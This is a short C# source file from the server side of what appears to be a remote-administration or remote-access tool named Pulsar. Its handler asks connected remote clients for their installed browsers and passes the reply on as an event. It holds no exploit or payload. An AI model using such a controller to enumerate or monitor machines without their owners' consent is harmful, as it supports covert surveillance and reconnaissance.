using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Query;
using Pulsar.Common.Messages.Monitoring.Query.Browsers;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models.Query.Browsers;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System.Collections.Generic;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for querying remote client information (e.g. installed browsers).
    /// </summary>
    public class QueryHandler : MessageProcessorBase<object>
    {
        public delegate void BrowsersReceivedEventHandler(object sender, Client client, List<QueryBrowsers> browsers);

        public event BrowsersReceivedEventHandler BrowsersReceived;

        public QueryHandler() : base(true)
        {
        }

        public override bool CanExecute(IMessage message) => message is GetBrowsersResponse;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            if (message is GetBrowsersResponse response)
            {
                Execute((Client)sender, response);
            }
        }

        private void Execute(Client client, GetBrowsersResponse message)
        {
            BrowsersReceived?.Invoke(this, client, message.QueryBrowsers);
        }

        /// <summary>
        /// Requests the list of installed browsers from the given client.
        /// </summary>
        public void GetBrowsers(Client client)
        {
            client.Send(new GetBrowsers());
        }
    }
}
